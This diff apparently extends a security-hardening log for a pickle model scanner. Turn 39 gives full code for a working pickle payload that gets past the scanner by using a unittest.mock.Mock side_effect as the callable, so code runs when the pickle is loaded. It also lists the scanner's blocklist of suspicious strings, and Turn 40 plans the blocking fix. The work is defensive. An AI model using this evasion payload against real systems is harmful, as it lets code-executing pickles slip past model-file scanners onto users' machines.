@@ -1577,3 +1577,99 @@ Blocking plan:
 Performance note: the fix adds three tuples to a sorted static table checked
 with binary search. It does not add cleanup-stack state modeling,
 context-manager simulation, or broader callback-flow tracking.
+
+## Turn 39 - `unittest.mock.Mock` side-effect call-proxy gap
+
+Goal: produce another immediate RCE-capable pickle that
+`packages/modelaudit-picklescan` does not flag.
+
+Payload shape:
+
+```python
+from pathlib import Path
+
+
+def s(value: str) -> bytes:
+    data = value.encode()
+    return b"\x8c" + bytes([len(data)]) + data
+
+
+def sg(module: str, name: str) -> bytes:
+    return s(module) + s(name) + b"\x93"
+
+
+marker = Path("/tmp/ma_unittest_mock_marker")
+payload = b"".join(
+    [
+        b"\x80\x04",
+        sg("unittest.mock", "Mock"),
+        b"(",
+        b"N",
+        sg("pathlib", "Path.touch"),
+        b"tR\x94",
+        b"h\x00",
+        sg("pathlib", "PosixPath"),
+        b"(",
+        s("/"),
+        s("tmp"),
+        s("ma_unittest_mock_marker"),
+        b"tR",
+        b"\x85R.",
+    ]
+)
+```
+
+Proof on CPython 3.12.12:
+
+- Scanner result: `status=complete`, `verdict=clean`, `is_clean=True`,
+  `findings=[]`
+- Scanner import references:
+  `unittest.mock.Mock`, `pathlib.Path.touch`, and `pathlib.PosixPath`, all
+  with `is_dangerous=False`
+- Unpickle result: creates `/tmp/ma_unittest_mock_marker` before
+  `pickle.loads()` returns and returns `None`
+- RCE mechanism: the pickle constructs
+  `unittest.mock.Mock(None, pathlib.Path.touch)`, using the second positional
+  argument as the mock's `side_effect`. It memoizes the mock instance, then
+  uses that memoized object directly as the `REDUCE` callable with `(marker,)`
+  as arguments. Calling the mock dispatches the attacker-selected
+  `side_effect`, so `pathlib.Path.touch(marker)` executes during unpickling.
+
+Why the scanner missed it:
+
+- `unittest.mock` is absent from both `DANGEROUS_WILDCARD_MODULES` and
+  `DANGEROUS_GLOBALS`.
+- The payload avoids any `__call__` string literal by using the memoized mock
+  object itself as the callable operand to `REDUCE`, so the suspicious
+  magic-method string heuristic does not fire.
+- The payload uses only currently clean globals: `unittest.mock.Mock`,
+  `pathlib.Path.touch`, and `pathlib.PosixPath`.
+- There are no suspicious string seeds such as `eval(`, `exec(`, `__import__`,
+  `os.system`, or `subprocess`.
+
+Performance note: this is a callable-proxy constructor sink: the dangerous
+behavior is not a separate global method, but an object produced by
+`unittest.mock.Mock` with attacker-controlled `side_effect`. The focused next
+block should add sorted `DANGEROUS_GLOBALS` entries for
+`("unittest.mock", "Mock")` and `("unittest.mock", "MagicMock")`, plus a
+manual-pickle oracle regression for the memoized mock proof. The hot path
+remains static policy lookup.
+
+## Turn 40 - Block `unittest.mock` callable proxies
+
+Blocking plan:
+
+- Add `("unittest.mock", "Mock")` and `("unittest.mock", "MagicMock")` to the
+  sorted Rust `DANGEROUS_GLOBALS` table. These constructors can produce
+  callable proxy objects with attacker-controlled `side_effect`, so the
+  dangerous callable may be a later stack object rather than a separate global
+  method reference.
+- Add portable policy coverage for both raw global reductions so detection does
+  not depend on mock call timing.
+- Add a CPython oracle regression that manually builds the memoized mock
+  payload, verifies scanner detection for `Mock`, then proves the side-effect
+  callback creates the marker during `pickle.loads()`.
+
+Performance note: the fix adds two tuples to a sorted static table checked with
+binary search. It does not add object-provenance tracking, side-effect
+introspection, or broader callable-flow analysis.
